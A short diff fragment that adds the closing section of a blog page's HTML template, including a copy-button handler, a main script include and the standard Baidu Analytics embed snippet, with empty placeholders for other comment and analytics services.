+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?09589470e358e72a59d6b6a6a3fb6afc";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
